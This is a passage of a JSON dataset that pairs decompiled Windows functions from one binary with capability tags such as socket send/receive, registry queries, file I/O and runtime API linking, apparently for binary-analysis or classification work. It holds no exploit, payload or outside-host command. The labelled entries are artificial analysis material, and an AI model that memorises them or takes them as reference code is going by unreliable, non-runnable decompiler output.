        "decompiled_code": "\nvoid fcn.0045a9f4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *(in_EAX + 8);\n    do {\n        iVar1 = *(iVar1 + 0xc);\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 71
    },
    "0045aa04": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0045aa04(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    fcn.0045a9f0();\n    for (iVar1 = *(in_EAX + 8); iVar1 != 0; iVar1 = *(iVar1 + 0xc)) {\n        iVar2 = fcn.0045a470();\n        if (0 < iVar2) {\n            fcn.0045a9f4();\n            fcn.0045aa04();\n        }\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "0045aa44": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0045aa44(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = *(in_EAX + 8);\n    do {\n        if (iVar1 == 0) {\n            return;\n        }\n        iVar2 = fcn.0045a9c8();\n        iVar3 = fcn.0045a4e0();\n        if (iVar2 < iVar3) {\ncode_r0x0045aa78:\n            fcn.0045a6ac();\n            fcn.0045ad84(0x45c880, *(in_EAX + 0x1c));\n        }\n        else {\n            iVar2 = fcn.0045a9c8();\n            iVar3 = fcn.0045a528();\n            if (iVar3 < iVar2) goto code_r0x0045aa78;\n        }\n        fcn.0045aa44();\n        iVar1 = *(iVar1 + 0xc);\n    } while( true );\n}\n",
        "token_count": 235
    },
    "0045aab0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0045aab0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(in_EAX + 0x18);\n    while( true ) {\n        if (iVar2 == 0) {\n            return 0;\n        }\n        cVar1 = fcn.0045a4a8();\n        if (cVar1 != '\\0') break;\n        iVar2 = *(iVar2 + 0x18);\n    }\n    return iVar2;\n}\n",
        "token_count": 121
    },
    "0045ad48": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045ad48(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    (**(arg_8h + 8))();\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0045ad48(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.0045ad48(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0045bea0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045bea0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0045bea0(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.0045bea0(arg_8h);\n    }\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 103
    },
    "0045c678": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045c678(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (in_EAX != 0) {\n        iVar2 = fcn.0045aaa4();\n        if ((iVar2 == 0) && (in_EAX != *(*(arg_8h + -4) + 100))) {\n            cVar1 = fcn.0045a4a8();\n            if (cVar1 != '\\0') {\n                if (*(*(arg_8h + -4) + 100) == *(in_EAX + 0x14)) {\n                    fcn.0045a9f0();\n                }\n                else {\n                    fcn.0045a9c8();\n                    fcn.0045a9f0();\n                }\n            }\n        }\n        iVar2 = arg_8h;\n        fcn.0045aacc();\n        fcn.0045c678(iVar2);\n        fcn.0045aaa4();\n        fcn.0045c678(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 251
    },
    "0045caec": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045caec(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    cVar1 = fcn.0045a428();\n    if (cVar1 == '\\0') {\n        *(in_EAX + 0x24) = 0;\n    }\n    else {\n        iVar2 = fcn.0045a4e0();\n        *(in_EAX + 0x24) = *(in_EAX + 0x20) - iVar2;\n    }\n    if (*(in_EAX + 0x14) != 0) {\n        cVar1 = fcn.0045a4a8();\n        if (cVar1 == '\\0') {\n            fcn.0045caec(arg_8h);\n        }\n    }\n    iVar2 = fcn.0045aab0();\n    if (iVar2 != 0) {\n        fcn.0045aab0();\n        fcn.0045aa04();\n    }\n    fcn.0045ad84(0x45c880, *(arg_8h + -4));\n    return;\n}\n",
        "token_count": 258
    },
    "0045e724": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0045e724(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint unaff_EBX;\n    uchar *unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint in_stack_ffffffd0;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uchar *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_ch = 4;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x45e86e;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_20h;\n    var_14h = unaff_ESI;\n    var_10h = unaff_EBX;\n    cVar1 = fcn.0045e87c();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.0040700c();\n        in_stack_ffffffd0 = *(in_EAX + 0x30);\n        uVar3 = sub.oleaut32.dll_GetActiveObject(in_stack_ffffffd0, 0, uVar2);\n        if ((uVar3 & 0x80000000) != 0) {\n            fcn.0042bdc4();\n        }\n    }\n    else if (cVar1 == '\\x01') {\n        fcn.0042bdc4();\n    }\n    else if (cVar1 == '\\x02') {\n        uVar2 = fcn.0040700c();\n        in_stack_ffffffd0 = *(in_EAX + 0x30);\n        uVar3 = sub.oleaut32.dll_GetActiveObject(in_stack_ffffffd0, 0, uVar2);\n        if ((uVar3 & 0x80000000) != 0) {\n            arg_8h = &var_4h;\n            fcn.0042bd98();\n            var_14h = var_18h;\n            var_10h = CONCAT31(var_10h._1_3_, 0xb);\n            fcn.0042bd10();\n            var_ch = var_1ch;\n            var_8h._0_1_ = 0xb;\n            fcn.00407550(&var_14h);\n            fcn.0040af88(arg_8h);\n            fcn.0042bb78(0, uVar3);\n            fcn.00404ec4();\n        }\n    }\n    else if (cVar1 == '\\x03') {\n        fcn.00405ea8();\n        fcn.0042bedc();\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00405d28(0x45e875);\n    fcn.00405554();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 769
    },
    "00461ae8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00461ae8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    puStack24 = 0x461afa;\n    fcn.004059cc();\n    uStack28 = 0x461b6a;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    uStack40 = 0x461b43;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar2 = 1;\n    puStack24 = &stack0xfffffffc;\n    while( true ) {\n        iVar1 = fcn.0040580c();\n        if (iVar1 < iVar2) break;\n        fcn.00461940();\n        iVar2 = iVar2 + 1;\n    }\n    *in_FS_OFFSET = uStack44;\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x461b71;\n    uStack28 = 0x461b69;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 303
    },
    "00466220": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00466220(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    for (iVar1 = 0; (iVar1 < *(in_EAX + 8) && (param_2 != *(*(in_EAX + 4) + iVar1 * 4))); iVar1 = iVar1 + 1) {\n    }\n    if (iVar1 == *(in_EAX + 8)) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 126
    },
    "004695b4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004695b4(void)\n\n{\n    int32_t iVar1;\n    \n    *0x490b44 = 0;\n    iVar1 = sub.user32.dll_GetWindow();\n    while (iVar1 != 0) {\n        iVar1 = func_0x004081d8(iVar1, 2);\n        *0x490b44 = *0x490b44 + 1;\n    }\n    iVar1 = *0x490b44;\n    *0x490b44 = 0;\n    return iVar1;\n}\n",
        "token_count": 121
    },
    "0048113c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0048113c(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4811ba;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.004033b8();\n    fcn.00405530();\n    iVar1 = 0x400;\n    do {\n        fcn.004033e0();\n        fcn.00405718();\n        fcn.00405818();\n        fcn.00405584();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4811c1;\n    uStack32 = 0x4811b9;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 235
    },
    "004815cc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004815cc(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x48164a;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.004033b8();\n    fcn.00405530();\n    iVar1 = 0x400;\n    do {\n        fcn.004033e0();\n        fcn.00405718();\n        fcn.00405818();\n        fcn.00405584();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x481651;\n    uStack32 = 0x481649;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 230
    },
    "00482740": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.00482740(uint param_1, uint param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uchar uVar1;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = 6;\n    do {\n        var_10h = var_10h + -1;\n    } while (var_10h != 0);\n    var_18h = 0x482765;\n    var_8h = param_2;\n    fcn.004059cc();\n    var_18h = 0x48276d;\n    fcn.004059cc();\n    uVar1 = true;\n    var_1ch = 0x482989;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00482740::var_20h;\n    var_18h = &stack0xfffffffc;\n    fcn.00405974();\n    if (!uVar1) {\n        fcn.00405974();\n        if (!uVar1) {\n            fcn.00405974();\n            if (uVar1) {\n                fcn.00488388();\n                fcn.0040a5c4();\n                var_2ch = var_8h;\n                fcn.004058e0(var_8h, 0x4829c4, var_ch);\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.00488388();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.004882c0();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.00489414();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.00489414();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.00489414();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.00489414();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.00489414();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.00489414();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                uVar1 = 1;\n                fcn.00489414();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.004881f8();\n                fcn.00405864();\n            }\n            goto code_r0x0048296e;\n        }\n    }\n    fcn.00405584();\ncode_r0x0048296e:\n    *in_FS_OFFSET = var_2ch;\n    fcn.00405554(0x482990);\n    return;\n}\n",
        "token_count": 861
    },
    "00484a6c": {
        "rules": [
            "contain loop",
            "receive data",
            "send data on socket",
            "send data",
            "receive data on socket"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00484a6c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *var_4h;\n    \n    fcn.004030fc();\n    iVar1 = fcn.004663cc();\n    var_4h = fcn.00404620();\n    fcn.0041b788(iVar1, iVar1 >> 0x1f);\n    fcn.0041b968();\n    fcn.0041b724(0, 0);\n    do {\n        fcn.00403af4();\n        iVar1 = (**(*var_4h + 0xc))();\n        if (iVar1 == 0) break;\n        var_4h = 0x49839c;\n        sub.wsock32.dll_send(*0x49a39c, 0x49839c, iVar1);\n        sub.wsock32.dll_recv(*0x49a39c, 0x49839c, 0x1fff, 0);\n    } while (iVar1 != 0);\n    fcn.00474e58();\n    fcn.0040f934();\n    return;\n}\n",
        "token_count": 269
    },
    "00485960": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00485960(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    uint *puStack64;\n    uint *puStack60;\n    uchar *puStack56;\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_11h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    puStack40 = 0x485978;\n    fcn.004059cc();\n    uStack44 = 0x485ab0;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    uStack52 = 0x49a3a4;\n    puStack56 = 0x485994;\n    puStack40 = &stack0xfffffffc;\n    sub.kernel32.dll_EnterCriticalSection();\n    puStack60 = 0x485a8e;\n    puStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    iVar1 = (**(**0x49a3a0 + 0x14))();\n    if (iVar1 < 1) {\n        fcn.00404f70();\n        *in_FS_OFFSET = puStack64;\n        puStack56 = 0x485ab7;\n        puStack60 = 0x485aaf;\n        fcn.00405554();\n        return;\n    }\n    iVar1 = (**(**0x49a3a0 + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(**0x49a3a0 + 0xc))();\n            puStack60 = &fcn.00485960::var_8h;\n            puStack64 = 0x4859f2;\n            fcn.00405b28();\n            puStack64 = 0x485a02;\n            fcn.00405a44();\n            puStack64 = 0x485a0f;\n            fcn.00405b28();\n            puStack64 = 0x485a1e;\n            fcn.00405a84();\n            puStack64 = &fcn.00485960::var_ch;\n            iVar2 = fcn.00405b28();\n            uVar3 = iVar2 == 1;\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.00405974();\n            if (uVar3) break;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = puStack64;\n    puStack56 = 0x485a95;\n    puStack60 = 0x49a3a4;\n    puStack64 = 0x485a8d;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 683
    },
    "00485ad0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00485ad0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    uchar uVar4;\n    uint *puStack72;\n    uint *puStack68;\n    uint *puStack64;\n    uint *puStack60;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    puStack48 = 0x485aea;\n    fcn.004059cc();\n    uStack52 = 0x485cb9;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x49a3a4;\n    puStack64 = 0x485b02;\n    puStack48 = &stack0xfffffffc;\n    sub.kernel32.dll_EnterCriticalSection();\n    puStack68 = 0x485c97;\n    puStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    iVar1 = (**(**0x49a3a0 + 0x14))();\n    if (iVar1 < 1) {\n        fcn.00404f70();\n        *in_FS_OFFSET = puStack72;\n        puStack64 = 0x485cc0;\n        puStack68 = 0x485cb8;\n        fcn.00405554();\n        return;\n    }\n    iVar1 = (**(**0x49a3a0 + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(**0x49a3a0 + 0xc))();\n            puStack60 = &fcn.00485ad0::var_8h;\n            puStack64 = 0x485b60;\n            fcn.00405b28();\n            puStack64 = 0x485b70;\n            fcn.00405a44();\n            puStack64 = 0x485b7d;\n            fcn.00405b28();\n            puStack64 = 0x485b8c;\n            fcn.00405a84();\n            puStack64 = &fcn.00485ad0::var_ch;\n            puStack68 = 0x485b9d;\n            fcn.00405b28();\n            puStack68 = 0x485bad;\n            fcn.00405a44();\n            puStack68 = 0x485bba;\n            fcn.00405b28();\n            puStack68 = 0x485bc9;\n            fcn.00405a84();\n            puStack68 = &fcn.00485ad0::var_10h;\n            puStack72 = 0x485bda;\n            fcn.00405b28();\n            puStack72 = 0x485bea;\n            fcn.00405a44();\n            puStack72 = 0x485bf7;\n            fcn.00405b28();\n            puStack72 = 0x485c06;\n            fcn.00405a84();\n            puStack72 = &fcn.00485ad0::var_14h;\n            iVar2 = fcn.00405b28();\n            uVar4 = iVar2 == 1;\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.004055c8();\n            fcn.00405974();\n            if (uVar4) {\n                uVar3 = fcn.00409ecc();\n                sub.wsock32.dll_closesocket(uVar3);\n                (**(**0x49a3a0 + 0x48))();\n                break;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = puStack72;\n    puStack64 = 0x485c9e;\n    puStack68 = 0x49a3a4;\n    puStack72 = 0x485c96;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 990
    },
    "00485cd4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00485cd4(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint *puStack72;\n    uint *puStack68;\n    uint *puStack64;\n    uint *puStack60;\n    uint uStack56;\n    uchar *puStack52;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    uStack56 = 0x485ecf;\n    puStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack64 = 0x49a3a4;\n    puStack68 = 0x485cfc;\n    sub.kernel32.dll_EnterCriticalSection();\n    puStack72 = 0x485ead;\n    puStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    uStack80 = 0x485d14;\n    puStack68 = &stack0xfffffffc;\n    iVar1 = (**(**0x49a3a0 + 0x14))();\n    if (0 < iVar1) {\n        uStack80 = 0x485d2c;\n        var_20h = (**(**0x49a3a0 + 0x14))();\n        if (-1 < var_20h + -1) {\n            do {\n                uStack80 = 0x485d50;\n                (**(**0x49a3a0 + 0xc))();\n                puStack60 = &fcn.00485cd4::var_4h;\n                puStack64 = 0x485d61;\n                fcn.00405b28();\n                puStack64 = 0x485d71;\n                fcn.00405a44();\n                puStack64 = 0x485d7e;\n                fcn.00405b28();\n                puStack64 = 0x485d8d;\n                fcn.00405a84();\n                puStack64 = &fcn.00485cd4::var_8h;\n                puStack68 = 0x485d9e;\n                fcn.00405b28();\n                puStack68 = 0x485dae;\n                fcn.00405a44();\n                puStack68 = 0x485dbb;\n                fcn.00405b28();\n                puStack68 = 0x485dca;\n                fcn.00405a84();\n                puStack68 = &fcn.00485cd4::var_ch;\n                puStack72 = 0x485ddb;\n                fcn.00405b28();\n                puStack72 = 0x485deb;\n                fcn.00405a44();\n                puStack72 = 0x485df8;\n                fcn.00405b28();\n                puStack72 = 0x485e07;\n                fcn.00405a84();\n                puStack72 = &fcn.00485cd4::var_10h;\n                puStack76 = 0x485e18;\n                fcn.00405b28();\n                puStack76 = 0x485e28;\n                fcn.00405a44();\n                puStack76 = 0x485e35;\n                fcn.00405b28();\n                puStack76 = 0x485e44;\n                fcn.00405a84();\n                puStack76 = 0x485e4f;\n                fcn.004055c8();\n                uStack80 = 0x485e75;\n                iStack84 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffac;\n                puStack76 = &stack0xfffffffc;\n                iVar1 = fcn.00409ecc();\n                sub.wsock32.dll_closesocket();\n                *in_FS_OFFSET = iVar1;\n                var_20h = var_20h + -1;\n            } while (var_20h != 0);\n        }\n        uStack80 = 0x485e95;\n        (**(**0x49a3a0 + 0x44))();\n        *in_FS_OFFSET = puStack76;\n        puStack68 = 0x485eb4;\n        puStack72 = 0x49a3a4;\n        puStack76 = 0x485eac;\n        sub.kernel32.dll_LeaveCriticalSection();\n        return;\n    }\n    uStack80 = 0x485d1d;\n    fcn.00404f70();\n    *in_FS_OFFSET = puStack76;\n    puStack68 = 0x485ed6;\n    puStack72 = 0x485ece;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1116
    },
    "00487fc4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00487fc4(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x488043;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.004033b8();\n    fcn.00405530();\n    if (0 < in_EAX) {\n        do {\n            fcn.004033e0();\n            fcn.00405718();\n            fcn.00405818();\n            fcn.00405584();\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x48804a;\n    uStack32 = 0x488042;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 238
    },
    "00488ac8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.00488ac8(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 5;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_20h = 0x488c5c;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00488ac8::var_24h;\n    var_18h = unaff_EDI;\n    var_14h = unaff_ESI;\n    fcn.00405530();\n    piVar1 = fcn.00421644();\n    piVar2 = fcn.00404620();\n    fcn.00421720();\n    fcn.00421864();\n    fcn.00421d58();\n    iVar3 = (**(*piVar2 + 0x14))();\n    if (-1 < iVar3 + -1) {\n        var_20h = 0;\n        var_24h = iVar3;\n        do {\n            (**(*piVar2 + 0xc))();\n            fcn.00405864();\n            fcn.00421864();\n            fcn.00421fe8();\n            fcn.00421fe8();\n            fcn.00421fe8();\n            fcn.00421fe8();\n            fcn.00421fe8();\n            (**(*piVar2 + 0xc))(*var_1ch);\n            var_4h = 0x488d64;\n            var_8h = var_ch;\n            var_ch = 0x488d64;\n            var_14h = 0x488d64;\n            var_18h = 0x488d64;\n            var_1ch = 0x488d64;\n            var_20h = 0x488d64;\n            var_24h = 0x488d70;\n            fcn.004058e0();\n            var_20h = var_20h + 1;\n            var_24h = var_24h + -1;\n        } while (var_24h != 0);\n    }\n    fcn.00404650();\n    fcn.004216f0();\n    (**(*piVar1 + -4))();\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x488c63;\n    var_20h = 0x488c4e;\n    fcn.00405554();\n    var_20h = 0x488c5b;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 771
    },
    "0040a1b4": {
        "rules": [
            "read file on Windows"
        ],
        "decompiled_code": "\nulong fcn.0040a1b4(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uStack36;\n    \n    iVar1 = sub.kernel32.dll_ReadFile_1();\n    uStack36 = in_EAX;\n    if (iVar1 == 0) {\n        uStack36 = 0xffffffff;\n    }\n    return CONCAT44(uStack36, uStack36);\n}\n",
        "token_count": 90
    },
    "0040a1e0": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nulong fcn.0040a1e0(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uStack36;\n    \n    iVar1 = sub.kernel32.dll_WriteFile_1();\n    uStack36 = in_EAX;\n    if (iVar1 == 0) {\n        uStack36 = 0xffffffff;\n    }\n    return CONCAT44(uStack36, uStack36);\n}\n",
        "token_count": 90
    },
    "00421ee8": {
        "rules": [
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00421ee8(uchar *param_1)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t unaff_EBX;\n    uint uVar4;\n    uchar *puStack20;\n    \n    puStack20 = param_1;\n    fcn.00403af4();\n    uVar2 = fcn.004059dc(0, &puStack20, 0, param_1 + 4);\n    uVar4 = *(in_EAX + 4);\n    iVar3 = sub.advapi32.dll_RegQueryValueExA_1(uVar4, uVar2);\n    uVar1 = fcn.0042161c();\n    *param_1 = uVar1;\n    return CONCAT44(uVar4, unaff_EBX & 0xffffff00 | iVar3 == 0);\n}\n",
        "token_count": 201
    },
    "0042c1ac": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nvoid fcn.0042c1ac(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x42c220);\n    if (iVar1 != 0) {\n        *0x48fe9c = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42c22c);\n        *0x48fea0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42c240);\n        *0x48fea4 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42c250);\n        *0x48fea8 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42c268);\n        *0x48feac = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42c280);\n        *0x48feb0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42c298);\n    }\n    return;\n}\n",
        "token_count": 222
    },
    "00431c64": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
